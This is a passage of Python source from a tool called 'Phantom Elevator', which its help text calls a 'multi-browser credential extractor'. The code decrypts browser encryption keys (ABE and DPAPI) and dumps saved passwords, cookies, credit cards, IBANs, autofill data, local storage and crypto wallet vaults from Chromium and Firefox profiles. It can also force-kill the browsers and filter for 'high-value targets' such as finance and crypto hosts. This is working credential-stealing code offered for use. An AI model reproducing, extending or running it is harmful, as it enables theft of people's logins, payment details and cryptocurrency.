                    w.writerow([
                        c.get("name_on_card", ""), c.get("number", ""),
                        c.get("exp_month", 0), c.get("exp_year", 0),
                        c.get("nickname", ""), c.get("origin", ""),
                        c.get("billing_address_id", ""),
                        1 if c.get("card_encrypted") else 0,
                    ])
        if ibans:
            with open(os.path.join(profile_out, "ibans.csv"),
                      "w", encoding="utf-8", newline="") as f:
                w = csv.writer(f)
                w.writerow(["nickname", "value", "encrypted_only"])
                for e in ibans:
                    w.writerow([e.get("nickname", ""), e.get("value", ""),
                                1 if e.get("encrypted") else 0])
        return

    if cards:
        with open(os.path.join(profile_out, "credit_cards.txt"),
                  "w", encoding="utf-8", newline="\n") as f:
            f.write("name_on_card\tnumber\texp_month\texp_year\tnickname\t"
                    "origin\tbilling_address_id\tencrypted_only\n")
            for c in cards:
                f.write("\t".join([
                    _tsv(c.get("name_on_card", "")),
                    _tsv(c.get("number", "")),
                    str(c.get("exp_month", 0)),
                    str(c.get("exp_year", 0)),
                    _tsv(c.get("nickname", "")),
                    _tsv(c.get("origin", "")),
                    _tsv(c.get("billing_address_id", "")),
                    "1" if c.get("card_encrypted") else "0",
                ]) + "\n")
    if ibans:
        with open(os.path.join(profile_out, "ibans.txt"),
                  "w", encoding="utf-8", newline="\n") as f:
            f.write("nickname\tvalue\tencrypted_only\n")
            for e in ibans:
                f.write(f"{_tsv(e.get('nickname', ''))}\t"
                        f"{_tsv(e.get('value', ''))}\t"
                        f"{'1' if e.get('encrypted') else '0'}\n")


def _write_local_storage(profile_out: str, entries: List[dict],
                          fmt: str = "tsv") -> None:
    if not entries:
        return
    os.makedirs(profile_out, exist_ok=True)

    if fmt == "json":
        with open(os.path.join(profile_out, "local_storage.json"),
                  "w", encoding="utf-8") as f:
            json.dump(entries, f, ensure_ascii=False, indent=2)
        return

    if fmt == "csv":
        with open(os.path.join(profile_out, "local_storage.csv"),
                  "w", encoding="utf-8", newline="") as f:
            w = csv.writer(f)
            w.writerow(["origin", "key", "value"])
            for e in entries:
                w.writerow([e["origin"], e["key"], e["value"]])
        return

    lsdir = os.path.join(profile_out, "local_storage")
    os.makedirs(lsdir, exist_ok=True)
    by: Dict[str, List[dict]] = {}
    for e in entries:
        by.setdefault(e["origin"], []).append(e)

    for origin, items in by.items():
        try:
            host = urlparse(origin).hostname or origin
        except Exception:
            host = origin
        fn = _safe_domain(host) + ".txt"
        with open(os.path.join(lsdir, fn),
                  "w", encoding="utf-8", newline="\n") as f:
            f.write(f"origin: {origin}\n")
            f.write(f"entries: {len(items)}\n")
            f.write("=" * 70 + "\n\n")
            for e in sorted(items, key=lambda x: x["key"]):
                f.write(f"--- {e['key']} ---\n")
                val = e["value"] or ""
                stripped = val.lstrip()
                if stripped.startswith(("{", "[")):
                    try:
                        parsed = json.loads(val)
                        val = json.dumps(parsed, indent=2,
                                          ensure_ascii=False)
                    except Exception:
                        pass
                f.write(val + "\n\n")


def _write_account(profile_out: str, acct: dict) -> bool:
    if not acct:
        return False
    has_any = any(acct.get(k) for k in
                  ("email", "gaia", "account_id", "full_name", "picture_url"))
    if not has_any:
        return False
    os.makedirs(profile_out, exist_ok=True)
    try:
        with open(os.path.join(profile_out, "account.txt"),
                  "w", encoding="utf-8", newline="\n") as f:
            f.write("field\tvalue\n")
            for k in ("email", "full_name", "display_name",
                      "gaia", "account_id", "picture_url"):
                v = acct.get(k)
                if v:
                    f.write(f"{k}\t{_tsv(v)}\n")
            if acct.get("signed_in"):
                f.write("signed_in\tyes\n")
            srcs = acct.get("sources") or []
            if srcs:
                f.write(f"sources\t{_tsv(', '.join(srcs))}\n")
        return True
    except Exception:
        return False


def _flatten_chromium_bookmarks(node, path="") -> List[dict]:
    out = []
    if not isinstance(node, dict):
        return out
    if "url" in node:
        out.append({
            "title": node.get("name", ""),
            "url": node["url"],
            "folder": path,
            "date_added_us": node.get("date_added", 0),
        })
    folder_name = node.get("name", "") if node.get("type") == "folder" else ""
    child_path = (path + "/" + folder_name) if folder_name else path
    for child in node.get("children", []) or []:
        out.extend(_flatten_chromium_bookmarks(child, child_path))
    return out


def _write_bookmarks(profile_out: str, data, browser: str = "chromium",
                     output_fmt: str = "tsv") -> None:
    if data is None:
        return
    os.makedirs(profile_out, exist_ok=True)

    if browser == "chromium" and isinstance(data, dict):
        roots = data.get("roots", {})
        entries: List[dict] = []
        for root_name in ("bookmark_bar", "other", "synced"):
            r = roots.get(root_name)
            if r:
                entries.extend(_flatten_chromium_bookmarks(r, ""))
        if output_fmt == "json":
            with open(os.path.join(profile_out, "bookmarks.json"),
                      "w", encoding="utf-8") as f:
                json.dump(entries, f, ensure_ascii=False, indent=2)
        elif output_fmt == "csv":
            with open(os.path.join(profile_out, "bookmarks.csv"),
                      "w", encoding="utf-8", newline="") as f:
                w = csv.writer(f)
                w.writerow(["folder", "title", "url", "date_added_us"])
                for e in entries:
                    w.writerow([e["folder"], e["title"],
                                e["url"], e["date_added_us"]])
        else:
            with open(os.path.join(profile_out, "bookmarks.txt"),
                      "w", encoding="utf-8", newline="\n") as f:
                f.write("folder\ttitle\turl\tdate_added_us\n")
                for e in entries:
                    f.write(f"{_tsv(e['folder'])}\t{_tsv(e['title'])}\t"
                            f"{_tsv(e['url'])}\t{e['date_added_us']}\n")
        return

    if output_fmt == "json":
        with open(os.path.join(profile_out, "bookmarks.json"),
                  "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    elif output_fmt == "csv":
        with open(os.path.join(profile_out, "bookmarks.csv"),
                  "w", encoding="utf-8", newline="") as f:
            w = csv.writer(f)
            w.writerow(["date_added_us", "title", "url"])
            for e in data:
                w.writerow([e["date_added_us"], e["title"], e["url"]])
    else:
        with open(os.path.join(profile_out, "bookmarks.txt"),
                  "w", encoding="utf-8", newline="\n") as f:
            f.write("date_added_us\ttitle\turl\n")
            for e in data:
                f.write(f"{e['date_added_us']}\t"
                        f"{_tsv(e['title'])}\t{_tsv(e['url'])}\n")


def _write_preferences(profile_out: str, data) -> None:
    if data is None:
        return
    os.makedirs(profile_out, exist_ok=True)
    with open(os.path.join(profile_out, "preferences.json"),
              "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)


def _write_extensions(profile_out: str, exts: List[dict],
                      dump_storage: bool, wallet_filter: bool,
                      profile_dir: str, fmt: str = "tsv") -> None:
    if not exts:
        return
    os.makedirs(profile_out, exist_ok=True)
    filtered = []
    for e in exts:
        if wallet_filter and not e.get("wallet"):
            continue
        filtered.append(e)

    j = [{k: v for k, v in e.items()
          if k not in ("path", "manifest_path")}
         for e in filtered]
    with open(os.path.join(profile_out, "extensions.txt"),
              "w", encoding="utf-8") as f:
        json.dump(j, f, ensure_ascii=False, indent=2)

    if fmt == "csv":
        with open(os.path.join(profile_out, "extensions.csv"),
                  "w", encoding="utf-8", newline="") as f:
            w = csv.writer(f)
            w.writerow(["id", "name", "version", "wallet",
                        "permissions", "description"])
            for e in filtered:
                w.writerow([
                    e["id"], e["name"], e["version"],
                    e.get("wallet", "") or "",
                    "|".join(e.get("permissions", [])),
                    e.get("description", ""),
                ])

    edir = os.path.join(profile_out, "extensions")
    for e in filtered:
        sub = os.path.join(edir, _safe_domain(e["id"]))
        os.makedirs(sub, exist_ok=True)
        if e.get("manifest_path") and os.path.isfile(e["manifest_path"]):
            try:
                shutil.copy2(e["manifest_path"],
                             os.path.join(sub, "manifest.json"))
            except Exception:
                pass
        try:
            with open(os.path.join(sub, "info.txt"),
                      "w", encoding="utf-8", newline="\n") as f:
                f.write(f"id: {e['id']}\n")
                f.write(f"name: {e['name']}\n")
                f.write(f"version: {e['version']}\n")
                if e.get("wallet"):
                    f.write(f"wallet: {e['wallet']}\n")
                desc = e.get("description", "")
                if desc:
                    f.write(f"description: {desc}\n")
                perms = e.get("permissions", [])
                if perms:
                    f.write("permissions:\n")
                    for p in perms:
                        f.write(f"  - {p}\n")
        except Exception:
            pass
        if dump_storage:
            storage = _chromium_extension_storage(profile_dir, e["id"])
            if storage:
                with open(os.path.join(sub, "storage.txt"),
                          "w", encoding="utf-8", newline="\n") as f:
                    for k, v, _raw in storage:
                        f.write(f"=== {k} ===\n{v}\n\n")


def _kill_browser(exe: Optional[str]) -> None:
    if not exe:
        return
    name = os.path.basename(exe)
    subprocess.run(["taskkill", "/F", "/T", "/IM", name],
                   capture_output=True)
    time.sleep(2)


def _detect_chromium(cfg: dict) -> Optional[dict]:
    ud = cfg["user_data"]
    exe = next((p for p in cfg["exe"] if os.path.isfile(p)), None)
    if not exe or not os.path.isdir(ud):
        return None
    profiles = _chromium_profiles(ud, cfg.get("profile_mode", "chromium"))
    if not profiles:
        return None
    return {"exe": exe, "profiles": profiles}


def _detect_firefox(base: str) -> Optional[dict]:
    profiles = _firefox_profiles(base)
    return {"profiles": profiles} if profiles else None


def _fmt_profile_line(prof: str, counts: dict, marker: str,
                      tag: str, cats: List[str]) -> str:
    parts = []
    for k in cats:
        n = counts.get(k, 0)
        if n:
            parts.append(f"{n} {k}")
    detail = "  ".join(parts)
    return (f"     {marker}  {_pad(prof, 22)}  "
            f"{C.GRY}{detail}{C.R}{tag}")


def _chromium_profile_cats(cfg: dict, prof: str, out_root: str,
                            opts: dict, drops: Drops,
                            emit: Callable[[str], None]
                            ) -> Tuple[dict, bool, bool]:
    cats = opts["cats"]
    name = cfg["name"]
    fmt = opts.get("format", "tsv")
    important = opts.get("important", False)
    pdir = (cfg["user_data"] if cfg.get("profile_mode") == "single"
            else os.path.join(cfg["user_data"], prof))
    pout = os.path.join(out_root, name, prof)
    counts = {"cookies": 0, "passwords": 0, "history": 0, "autofill": 0,
              "cards": 0, "local_storage": 0, "bookmarks": 0,
              "extensions": 0, "crypto": 0, "crypto_decrypted": 0,
              "account": 0}
    retries = opts.get("retries", DEFAULT_RETRIES)
    prof_wal_ok = True
    prof_copy_failed = False

    abe = opts.get("_abe")
    dpapi = opts.get("_dpapi")

    if "cookies" in cats:
        cookies = []
        for db in _chromium_cookie_dbs(cfg["user_data"], prof,
                                       cfg.get("profile_mode", "chromium")):
            c, w, cf = _chromium_cookies(db, abe, dpapi, drops, retries)
            cookies.extend(c)
            prof_wal_ok = prof_wal_ok and w
            if cf:
                prof_copy_failed = True
        if important:
            kept = [c for c in cookies if _host_is_important(c["host"])]
            drops.add("cookies", "skipped_not_important",
                      count=len(cookies) - len(kept))
            cookies = kept
        cookie_fmt = "netscape" if fmt == "tsv" else fmt
        _write_cookies(pout, cookies, fmt=cookie_fmt)
        counts["cookies"] = len(cookies)

    if "passwords" in cats:
        pwds = []
        for db in _chromium_pw_dbs(pdir):
            p, w, cf = _chromium_passwords(db, abe, dpapi, drops, retries)
            pwds.extend(p)
            prof_wal_ok = prof_wal_ok and w
            if cf:
                prof_copy_failed = True
        if important:
            kept = [p for p in pwds if _url_is_important(p["url"])]
            drops.add("passwords", "skipped_not_important",
                      count=len(pwds) - len(kept))
            pwds = kept
        _write_passwords(pout, pwds, fmt=fmt)
        counts["passwords"] = len(pwds)

    if "history" in cats:
        h = _chromium_history(pdir, drops, retries)
        if important:
            kept = [e for e in h if _url_is_important(e["url"])]
            drops.add("history", "skipped_not_important",
                      count=len(h) - len(kept))
            h = kept
        _write_history(pout, h, fmt=fmt)
        counts["history"] = len(h)

    if "autofill" in cats:
        a = _chromium_autofill(pdir, drops, retries)
        _write_autofill(pout, a, fmt=fmt)
        counts["autofill"] = len(a.get("fields", [])) + len(a.get("profiles", []))

    if "cards" in cats:
        c = _chromium_cards(pdir, abe, dpapi, drops, retries)
        _write_cards(pout, c, fmt=fmt)
        counts["cards"] = len(c.get("cards", [])) + len(c.get("ibans", []))

    if "local_storage" in cats:
        ls = _chromium_local_storage(pdir, drops, important_only=important)
        _write_local_storage(pout, ls, fmt=fmt)
        counts["local_storage"] = len(ls)

    if "bookmarks" in cats:
        b = _chromium_bookmarks(pdir)
        _write_bookmarks(pout, b, browser="chromium", output_fmt=fmt)
        if isinstance(b, dict):
            counts["bookmarks"] = _count_bookmark_urls(b)

    if "extensions" in cats or "crypto" in cats:
        exts = _chromium_extension_list(pdir)
        wfilter = ("crypto" in cats) and ("extensions" not in cats)
        _write_extensions(pout, exts, dump_storage=True,
                          wallet_filter=wfilter, profile_dir=pdir,
                          fmt=fmt)
        if "extensions" in cats:
            counts["extensions"] = len(exts)
        if "crypto" in cats:
            wallets = _write_wallets(pout, pdir, opts.get("wallet_password"),
                                      drops)
            counts["crypto"] = len(wallets)
            counts["crypto_decrypted"] = sum(
                1 for w in wallets if w.get("decrypted"))

    if "preferences" in cats:
        pref = _chromium_preferences(pdir)
        _write_preferences(pout, pref)

    acct = _chromium_account_info(pdir, cfg["user_data"])
    if _write_account(pout, acct):
        counts["account"] = 1

    return counts, prof_copy_failed, prof_wal_ok


def _count_bookmark_urls(node) -> int:
    if not isinstance(node, dict):
        return 0
    n = 0
    if "url" in node:
        n += 1
    for c in node.get("children", []) or []:
        n += _count_bookmark_urls(c)
    return n


def _process_chromium(cfg: dict, out_root: str, opts: dict,
                      drops: Drops,
                      emit: Callable[[str], None] = print) -> Optional[dict]:
    det = _detect_chromium(cfg)
    if not det:
        return None

    name = cfg["name"]
    profiles = det["profiles"]
    exe = det["exe"]
    cats = opts["cats"]

    running_before = _browser_running(exe)

    if opts.get("force_kill"):
        _kill_browser(exe)

    emit("")
    running_tag = ""
    if running_before and not opts.get("force_kill"):
        running_tag = f"   {C.YEL}running{C.R}"
    emit(f"  {C.CYN}◈{C.R}  {C.B}{C.TEXT}{name}{C.R}    "
         f"{C.FAINT}{len(profiles)} profile"
         f"{'s' if len(profiles) != 1 else ''}{C.R}"
         f"{running_tag}")
    if running_before and not opts.get("force_kill"):
        emit(f"     {C.YEL}!{C.R}  {os.path.basename(exe).lower()} is "
             f"running — cookies/passwords may be locked. "
             f"re-run with {C.B}--force-kill{C.R} to close it first")
    emit("")

    abe = None
    if cfg.get("abe") and ({"cookies", "passwords", "cards"} & set(cats)):
        with Spinner("extracting ABE key",
                     not opts["quiet"] and opts.get("spinner", True)) as sp:
            abe = _get_abe_key(cfg, drops=drops,
                               timeout=opts.get("timeout", DEFAULT_TIMEOUT))
            if abe:
                sp.ok(f"{C.CYN}{abe.hex()}{C.R}")
            else:
                sp.fail(f"{C.FAINT}v10 fallback{C.R}")

    dpapi = None
    ls = os.path.join(cfg["user_data"], "Local State")
    if os.path.isfile(ls):
        try:
            with open(ls, encoding="utf-8") as f:
                L = json.load(f)
            kb = L.get("os_crypt", {}).get("encrypted_key")
            if kb:
                e = base64.b64decode(kb)
                if e.startswith(b"DPAPI"):
                    e = e[5:]
                dpapi = dpapi_unprotect(e)
                if dpapi and len(dpapi) != 32:
                    dpapi = None
        except Exception:
            pass

    opts = dict(opts)
    opts["_abe"] = abe
    opts["_dpapi"] = dpapi

    totals = {k: 0 for k in ("cookies", "passwords", "history", "autofill",
                              "cards", "local_storage", "bookmarks",
                              "extensions", "crypto")}
    failed_profiles: List[Tuple[str, str]] = []
    profile_reports: List[dict] = []
    any_copy_failed = False
    any_wal_busy = False

    for prof in profiles:
        try:
            counts, cf, w = _chromium_profile_cats(
                cfg, prof, out_root, opts, drops, emit)
        except Exception as e:
            failed_profiles.append((prof, str(e)))
            emit(f"     {C.RED}✗{C.R}  {_pad(prof, 22)}  {C.RED}{e}{C.R}")
            continue
        for k, v in counts.items():
            if k in totals:
                totals[k] += v
        any_copy_failed = any_copy_failed or cf
        if not w:
            any_wal_busy = True
        if cf:
            marker = f"{C.RED}✗{C.R}"
            tag = f"   {C.RED}locked{C.R}"
        elif not w:
            marker = f"{C.YEL}△{C.R}"
            tag = f"   {C.YEL}wal busy{C.R}"
        elif any(counts.get(k, 0) for k in cats):
            marker = f"{C.GRN}✓{C.R}"
            tag = ""
        else:
            marker = f"{C.FAINT}·{C.R}"
            tag = ""
        emit(_fmt_profile_line(prof, counts, marker, tag, cats))
        if opts.get("stream") and sys.stdout.isatty():
            time.sleep(0.05)
        profile_reports.append({"name": prof, **counts,
                                "copy_failed": cf, "wal_ok": w})

    wallets_decrypted = sum(p.get("crypto_decrypted", 0)
                            for p in profile_reports)
    accounts_found = sum(p.get("account", 0) for p in profile_reports)

    return {"name": name, "mode": "abe" if cfg.get("abe") else "v10",
            "failed": failed_profiles, "profiles": profile_reports,
            "running": running_before,
            "copy_failed": any_copy_failed,
            "wal_busy": any_wal_busy,
            "wallets_decrypted": wallets_decrypted,
            "accounts": accounts_found,
            **totals}


def _process_firefox(name: str, base: str, out_root: str, opts: dict,
                     drops: Drops,
                     emit: Callable[[str], None] = print) -> Optional[dict]:
    det = _detect_firefox(base)
    if not det:
        return None

    exe = next((p for p in _FIREFOX_EXE_PATHS.get(name, [])
                if os.path.isfile(p)), None)
    running_before = _browser_running(exe)

    if opts.get("force_kill") and exe:
        _kill_browser(exe)

    profiles = det["profiles"]
    cats = opts["cats"]
    fmt = opts.get("format", "tsv")
    important = opts.get("important", False)
    emit("")
    running_tag = ""
    if running_before and not opts.get("force_kill"):
        running_tag = f"   {C.YEL}running{C.R}"
    emit(f"  {C.CYN}◈{C.R}  {C.B}{C.TEXT}{name}{C.R}    "
         f"{C.FAINT}{len(profiles)} profile"
         f"{'s' if len(profiles) != 1 else ''}{C.R}"
         f"{running_tag}")
    if running_before and not opts.get("force_kill"):
        emit(f"     {C.YEL}!{C.R}  {os.path.basename(exe).lower()} is "
             f"running — cookies may be locked. "
             f"re-run with {C.B}--force-kill{C.R} to close it first")
    emit("")

    totals = {k: 0 for k in ("cookies", "passwords", "history", "autofill",
                              "cards", "local_storage", "bookmarks",
                              "extensions", "crypto")}
    failed_profiles: List[Tuple[str, str]] = []
    profile_reports: List[dict] = []
    retries = opts.get("retries", DEFAULT_RETRIES)
    any_copy_failed = False
    any_wal_busy = False
    accounts_found = 0

    for prof in profiles:
        pdir = os.path.join(base, prof)
        pout = os.path.join(out_root, name, prof)
        counts = {k: 0 for k in totals}
        prof_wal_ok = True
        prof_copy_failed = False
        try:
            if "cookies" in cats:
                c, w, cf = _firefox_cookies(pdir, drops, retries)
                prof_wal_ok = prof_wal_ok and w
                if cf:
                    prof_copy_failed = True
                if important:
                    kept = [x for x in c if _host_is_important(x["host"])]
                    drops.add("cookies", "skipped_not_important",
                              count=len(c) - len(kept))
                    c = kept
                cookie_fmt = "netscape" if fmt == "tsv" else fmt
                _write_cookies(pout, c, fmt=cookie_fmt)
                counts["cookies"] = len(c)
            if "passwords" in cats:
                p = _firefox_passwords(pdir, drops)
                if important:
                    kept = [x for x in p if _url_is_important(x["url"])]
                    drops.add("passwords", "skipped_not_important",
                              count=len(p) - len(kept))
                    p = kept
                _write_passwords(pout, p, fmt=fmt)
                counts["passwords"] = len(p)
            if "history" in cats:
                h = _firefox_history(pdir, drops, retries)
                if important:
                    kept = [x for x in h if _url_is_important(x["url"])]
                    drops.add("history", "skipped_not_important",
                              count=len(h) - len(kept))
                    h = kept
                _write_history(pout, h, fmt=fmt)
                counts["history"] = len(h)
            if "bookmarks" in cats:
                b = _firefox_bookmarks(pdir, drops, retries)
                _write_bookmarks(pout, b, browser="firefox", output_fmt=fmt)
                counts["bookmarks"] = len(b)

            acct = _firefox_account_info(pdir)
            if _write_account(pout, acct):
                counts["account"] = 1
                accounts_found += 1
        except Exception as e:
            failed_profiles.append((prof, str(e)))
            emit(f"     {C.RED}✗{C.R}  {_pad(prof, 22)}  {C.RED}{e}{C.R}")
            continue
        for k, v in counts.items():
            if k in totals:
                totals[k] += v
        any_copy_failed = any_copy_failed or prof_copy_failed
        if not prof_wal_ok:
            any_wal_busy = True
        if prof_copy_failed:
            marker = f"{C.RED}✗{C.R}"
            tag = f"   {C.RED}locked{C.R}"
        elif not prof_wal_ok:
            marker = f"{C.YEL}△{C.R}"
            tag = f"   {C.YEL}wal busy{C.R}"
        elif any(counts.get(k, 0) for k in cats):
            marker = f"{C.GRN}✓{C.R}"
            tag = ""
        else:
            marker = f"{C.FAINT}·{C.R}"
            tag = ""
        emit(_fmt_profile_line(prof, counts, marker, tag, cats))
        if opts.get("stream") and sys.stdout.isatty():
            time.sleep(0.05)
        profile_reports.append({"name": prof, **counts,
                                "copy_failed": prof_copy_failed,
                                "wal_ok": prof_wal_ok})

    return {"name": name, "mode": "local", "failed": failed_profiles,
            "profiles": profile_reports,
            "running": running_before,
            "copy_failed": any_copy_failed,
            "wal_busy": any_wal_busy,
            "wallets_decrypted": 0,
            "accounts": accounts_found,
            **totals}


def _run_job(job: Job, out_root: str, opts: dict) -> None:
    emit = print if opts.get("stream") else job.output.append
    try:
        if job.kind == "chromium":
            job.result = _process_chromium(
                job.data, out_root, opts, job.drops, emit=emit)
        else:
            name, base = job.data
            job.result = _process_firefox(
                name, base, out_root, opts, job.drops, emit=emit)
    except Exception as e:
        job.error = e


def _build_jobs(opts: dict) -> List[Job]:
    jobs: List[Job] = []
    target = opts.get("target")

    def _keep(name: str) -> bool:
        if target and target != name.lower():
            return False
        return True

    for cfg in BROWSERS:
        if _keep(cfg["name"]):
            jobs.append(Job("chromium", cfg))
    for name, base in FIREFOX:
        if _keep(name):
            jobs.append(Job("firefox", (name, base)))

    return jobs


class _HelpFormatter(argparse.RawDescriptionHelpFormatter):
    def add_usage(self, usage, actions, groups, prefix=None):
        if prefix is None:
            prefix = "usage: "
        return super().add_usage(usage, actions, groups, prefix)


def _build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="phantom_elevator.py",
        description=(f"{C.B}{C.TEXT}Phantom Elevator{C.R} "
                     f"{C.FAINT}v{__version__}{C.R}  "
                     "multi-browser credential extractor"),
        epilog=(f"{C.FAINT}examples\n"
                f"  phantom_elevator.py                            "
                f"everything (default)\n"
                f"  phantom_elevator.py --force-kill               "
                f"everything, close browsers first\n"
                f"  phantom_elevator.py --cookies --passwords      "
                f"just those two\n"
                f"  phantom_elevator.py --cards --autofill         "
                f"cards + autofill\n"
                f"  phantom_elevator.py --wallets                  "
                f"wallet vaults + pw prompt\n"
                f"  phantom_elevator.py --wallets --wallet-password PW\n"
                f"  phantom_elevator.py --format json              "
                f"everything, JSON output\n"
                f"  phantom_elevator.py --format csv               "
                f"everything, CSV output\n"
                f"  phantom_elevator.py --important                "
                f"high-value targets only\n"
                f"  phantom_elevator.py --audit-only               "
                f"read-only health check\n"
                f"  phantom_elevator.py --list-browsers            "
                f"detected browsers\n"
                f"  phantom_elevator.py --list-wallets             "
                f"wallet support table\n"
                f"  phantom_elevator.py --install-launchers        "
                f"create pe.bat / pe-admin.bat\n"
                f"\naccount.txt is written per profile with signed-in "
                f"email + metadata\n"
                f"local_storage/ is written as one readable .txt per origin\n"
                f"extensions.txt is ALWAYS written (pretty-printed JSON inside)\n"
                f"\nauthor  {__author__}\n"
                f"github  {__github__}\n"
                f"discord {__discord__}{C.R}"),
        formatter_class=_HelpFormatter,
        add_help=False,
    )
    p.add_argument("-h", "--help", action="help",
                   help="show this help and exit")
    p.add_argument("--version", action="version",
                   version=f"{__tool__} {__version__}",
                   help="show version and exit")

    cat = p.add_argument_group("categories (none selected = all)")
    cat.add_argument("--all", action="store_true",
                     help="explicitly select every category")
    cat.add_argument("--cookies", action="store_true",
                     help="HTTP cookies")
    cat.add_argument("--passwords", action="store_true",
                     help="saved logins")
    cat.add_argument("--history", action="store_true",
                     help="browsing history")
    cat.add_argument("--autofill", action="store_true",
                     help="form autofill fields and profiles")
    cat.add_argument("--cards", action="store_true",
                     help="credit cards and IBANs")
    cat.add_argument("--local-storage", action="store_true",
                     dest="local_storage",
                     help="Local Storage leveldb entries")
    cat.add_argument("--bookmarks", action="store_true",
                     help="bookmarks")
    cat.add_argument("--extensions", action="store_true",
                     help="installed extensions and their storage")
    cat.add_argument("--wallets", action="store_true",
                     help="wallet vault extraction and raw dumps")

    run = p.add_argument_group("run control")
    run.add_argument("-o", "--output", default="out", metavar="DIR",
                     help="output directory (default: out)")
    run.add_argument("-t", "--target", default=None, metavar="NAME",
                     help="only this browser")
    run.add_argument("--force-kill", action="store_true",
                     help="terminate browsers before extraction")
    run.add_argument("--wallet-password", default=None, metavar="PW",
                     help="wallet vault password (env: PE_WALLET_PW)")
    run.add_argument("--no-wallet-prompt", action="store_true",
                     help="never prompt for wallet password")
    run.add_argument("--jobs", type=int, default=1, metavar="N",
                     help="parallel browser jobs (default: 1)")

    mod = p.add_argument_group("modes (bypass extraction)")
    mod.add_argument("--list-browsers", action="store_true",
                     help="list detected browsers and exit")
    mod.add_argument("--list-wallets", action="store_true",
                     help="list supported wallet extensions and exit")
    mod.add_argument("--audit-only", action="store_true",
                     help="read-only browser/profile and SQLite health audit")
    mod.add_argument("--install-launchers", action="store_true",
                     help="write pe.bat and pe-admin.bat next to this script")

    out = p.add_argument_group("output")
    out.add_argument("--format", choices=["tsv", "json", "csv", "txt"],
                     default="tsv",
                     help="output format (default: tsv = .txt files)")
    out.add_argument("--important", action="store_true",
                     help="only high-value targets (crypto/finance/auth "
                          "hosts, key-shaped Local Storage entries)")
    out.add_argument("--debug-drops", action="store_true",
                     help="print skipped-entry breakdown")
    out.add_argument("--no-color", action="store_true",
                     help="disable ANSI colors")
    out.add_argument("-v", "--verbose", action="store_true",
                     help="per-entry sample output")
    out.add_argument("-q", "--quiet", action="store_true",
                     help="suppress banner and progress")
    return p


def _cats_from_args(args) -> Tuple[str, ...]:
    selected = []
    if args.cookies:        selected.append("cookies")
    if args.passwords:      selected.append("passwords")
    if args.history:        selected.append("history")
    if args.autofill:       selected.append("autofill")
    if args.cards:          selected.append("cards")
    if args.local_storage:  selected.append("local_storage")
    if args.bookmarks:      selected.append("bookmarks")
    if args.extensions:     selected.append("extensions")
    if args.wallets:        selected.append("crypto")

    if args.all or not selected:
        return ALL_CATS

    return tuple(c for c in ALL_CATS if c in selected)


def _audit_sqlite(path: str) -> dict:
    result = {"present": os.path.isfile(path), "size_bytes": None,
              "integrity": "not_checked", "journal_sidecars": [],
              "error": None}
    if not result["present"]:
        return result
    try:
        result["size_bytes"] = os.path.getsize(path)
        for suffix in ("-wal", "-shm", "-journal"):
            sidecar = path + suffix
            if os.path.isfile(sidecar):
                result["journal_sidecars"].append({
                    "type": suffix[1:], "size_bytes": os.path.getsize(sidecar)})
        uri = "file:" + path.replace("\\", "/").replace("?", "%3f").replace("#", "%23") + "?mode=ro"
        con = sqlite3.connect(uri, uri=True, timeout=2.0)
        try:
            con.execute("PRAGMA query_only=ON")
            con.execute("PRAGMA busy_timeout=2000")
            rows = con.execute("PRAGMA quick_check").fetchall()
            result["integrity"] = "ok" if rows == [("ok",)] else "failed"
            if result["integrity"] == "failed":
                result["error"] = "SQLite quick_check reported an integrity issue"
        finally:
            con.close()
    except (OSError, sqlite3.Error, ValueError) as exc:
        result["integrity"] = "unavailable"
        result["error"] = type(exc).__name__ + ": audit could not complete"
    return result


def _audit_print(report: dict, quiet: bool = False) -> None:
    banner(quiet=quiet)
    print(f"  {C.CYN}◈{C.R}  {C.B}{C.TEXT}read-only audit{C.R}    "
          f"{C.FAINT}no bootstrap · no secrets read · no files modified{C.R}")
    print()

    if not report["browsers"]:
        warn("no installed browsers with profiles detected")
        print()
        return

    print(f"     {C.FAINT}{'BROWSER':<14}  {'PROFILE':<18}  "
          f"{'DATABASE':<26}  {'SIZE':>10}  INTEGRITY{C.R}")
    print(f"     {C.DIM}{'─' * 84}{C.R}")

    for browser in report["browsers"]:
        first = True
        for prof in browser["profiles"]:
            first_prof = True
            for db in prof["databases"]:
                bname = browser["browser"] if first else ""
                pname = prof["profile"] if first_prof else ""
                first = False
                first_prof = False
                size = _fmt_bytes(db.get("size_bytes"))
                integ = db.get("integrity", "?")
                if integ == "ok":
                    tag = f"{C.GRN}ok{C.R}"
                elif integ == "failed":
                    tag = f"{C.RED}failed{C.R}"
                else:
                    tag = f"{C.YEL}{integ}{C.R}"
                print(f"     {_pad(bname, 14)}  {_pad(pname, 18)}  "
                      f"{_pad(db['database'], 26)}  "
                      f"{_pad(size, 10, 'right')}  {tag}")

    print(f"     {C.DIM}{'─' * 84}{C.R}")
    print()
    print(f"     {C.GRY}browsers {C.R}{C.TEXT}{len(report['browsers'])}{C.R}"
          f"   {C.GRY}databases {C.R}{C.TEXT}{report['checks']}{C.R}"
          f"   {C.GRY}ok {C.R}{C.GRN}{report['ok']}{C.R}"
          f"   {C.GRY}failed {C.R}{C.RED}{report['failed']}{C.R}"
          f"   {C.GRY}unavailable {C.R}{C.YEL}{report['unavailable']}{C.R}")
    print(f"     {C.FAINT}secrets read: no   database files modified: no{C.R}")
    print()


def _audit_only(quiet: bool = False) -> int:
    report = {"browsers": [], "checks": 0, "ok": 0,
              "failed": 0, "unavailable": 0}

    for cfg in BROWSERS:
        if not _chromium_installed(cfg):
            continue
        root = cfg.get("user_data", "")
        if not root or not os.path.isdir(root):
            continue
        profiles = _chromium_profiles(root, cfg.get("profile_mode", "chromium"))
        if not profiles:
            continue
        browser = {"browser": cfg["name"], "family": "chromium", "profiles": []}
        for prof in profiles:
            prof_root = (root if cfg.get("profile_mode") == "single"
                         else os.path.join(root, prof))
            dbs = []
            for rel in ("Network/Cookies", "Cookies", "Login Data",
                        "Login Data For Account", "History", "Web Data",
                        "Bookmarks"):
                candidate = os.path.join(prof_root, rel)
                if not os.path.isfile(candidate):
                    continue
                result = _audit_sqlite(candidate)
                dbs.append({"database": rel, **result})
                report["checks"] += 1
                if result["integrity"] == "ok":
                    report["ok"] += 1
                elif result["integrity"] == "failed":
                    report["failed"] += 1
                else:
                    report["unavailable"] += 1
            if dbs:
                browser["profiles"].append({"profile": prof, "databases": dbs})
        if browser["profiles"]:
            report["browsers"].append(browser)

    for name, base in FIREFOX:
        if not _firefox_installed(name):
            continue
        if not os.path.isdir(base):
            continue
